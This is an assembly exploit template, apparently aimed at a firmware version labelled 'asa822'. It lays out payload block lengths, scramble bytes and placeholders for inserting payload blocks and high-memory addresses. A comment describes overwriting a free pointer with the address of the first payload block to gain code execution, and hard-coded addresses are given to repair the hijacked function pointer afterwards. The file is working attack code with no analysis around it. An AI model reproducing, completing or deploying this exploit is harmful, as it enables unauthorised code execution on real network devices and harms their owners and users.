.set vers_len, (vers_end - vers_start)
.set cleanup_len, (cleanup_end - cleanup_start)

.set block2_len, (block2_end - block2_start)
.set block3_len, (block3_end - block3_start)
.set block4_len, (block4_end - block4_start)
.set block5_len, (block5_end - block5_start)
.set block6_len, (block6_end - block6_start)
.set block7_len, (block7_end - block7_start)
.set block8_len, (block8_end - block8_start)
.set block9_len, (block9_end - block9_start)
.set block10_len, (block10_end - block10_start)
.set block11_len, (block11_end - block11_start)
.set block12_len, (block12_end - block12_start)
.set block13_len, (block13_end - block13_start)
.set block14_len, (block14_end - block14_start)

.set scramble_byte, 0xaa
.set scramble_word, 0xaaaaaaaa

/* v822: overwrite free ptr with addr of block1 to get code exec */
/* use these to fix it up after code exec is running */
.set orig_func_ptr_loc, 0x09c7484c
.set orig_func_ptr, 0x092dc3c0

.set valid_prev, 0x08048134   /* a string that strlen() can be happy with */
.globl valid_prev

__INSERT_HIGHMEM_ADDRS_HERE__

.section .text

/* ************************************ */

.globl vers_start
vers_start:
	.asciz "asa822"
.globl vers_end
vers_end:

/* ************************************ */

.include "epba_cleanup.s"

/* ************************************ */

__INSERT_PAYLOAD_BLOCKS_HERE__

/* ************************************ */

.globl block14_start
block14_start:
        # Break address into two parts. For unknown reason
	# the assembler will only write 16-bits for each
	# .word op.
	.word block1addr & 0x0000ffff
	.word block1addr>>16

.globl block14_end
block14_end:

/* ************************************ */
